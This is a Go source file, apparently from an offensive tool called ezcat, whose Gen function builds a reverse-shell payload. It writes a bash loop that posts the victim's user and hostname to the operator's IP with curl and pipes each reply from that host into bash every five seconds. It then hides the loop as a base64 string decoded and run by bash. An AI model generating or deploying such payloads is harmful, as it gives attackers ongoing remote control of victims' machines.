package shell

import (
	"encoding/base64"
	"errors"
	"fmt"
	"math/rand"
	"net"
	"strings"

	"github.com/ngn13/ezcat/bridge"
)

var numbers = []rune("1234567890")

func Gen(iface_name string) (string, error){
  var res net.IP

  iface, err := net.InterfaceByName(iface_name)
  if err != nil {
    return "", errors.New("Bad interface") 
  }

  addrs, err := iface.Addrs()
  if err != nil {
    return "", errors.New("Cannot get IPv4 address of the interface")
  }

  for _, a := range addrs {
    res = a.(*net.IPNet).IP.To4() 
    if res != nil {
      break
    }
  }

  if res == nil {
    return "", errors.New("Interface does not have an IPv4 address") 
  }

  newid := MakeID()
  ipv4 := res.String()
  port := strings.Split(bridge.GetAddr(), ":")[1]

  inner := fmt.Sprintf(
    "export RES=$(echo $(whoami)@$(hostname)); while true; do export RES=$(curl -X POST http://%s:%s/?id=%s --data \"$RES\" -s | bash); sleep 5; done\n", 
    ipv4, port, newid,
  )

  encoded := base64.StdEncoding.EncodeToString([]byte(inner))
  final := fmt.Sprintf("echo %s | base64 -d | bash", encoded)

  bridge.SHELLS = append(bridge.SHELLS, bridge.Shell{
    ID: newid,
    Cmd: "",
    Port: 0,
    Lhost: ipv4,
    Hostname: "",
    Connected: false,
  })
  return final, nil
}

func MakeID() string{
  b := make([]rune, 6)
  for i := range b {
    b[i] = numbers[rand.Intn(len(numbers))]
  }
  
  return string(b)
}


